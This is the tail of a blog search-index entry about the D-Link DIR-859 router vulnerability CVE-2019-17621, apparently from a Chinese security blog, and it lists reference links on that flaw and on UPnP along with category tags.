<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://medium.com/@s1kr10s/d-link-dir-859-rce-unautenticated-cve-2019-17621-en-d94b47a15104" target="_blank" rel="noopener">https://medium.com/@s1kr10s/d-link-dir-859-rce-unautenticated-cve-2019-17621-en-d94b47a15104</a></p>
<p><a href="https://nightrainy.github.io/2020/02/25/DIR-859-RCE分析-CVE-2019–17621复现/" target="_blank" rel="noopener">https://nightrainy.github.io/2020/02/25/DIR-859-RCE%E5%88%86%E6%9E%90-CVE-2019%E2%80%9317621%E5%A4%8D%E7%8E%B0/</a> </p>
<p><a href="https://www.ibm.com/developerworks/cn/linux/other/UPnP/part1/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/linux/other/UPnP/part1/index.html</a> </p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>iot</category>
      </categories>
      <tags>
        <tag>d-link</tag>
        <tag>dir-859</tag>
      </tags>
  </entry>
</search>
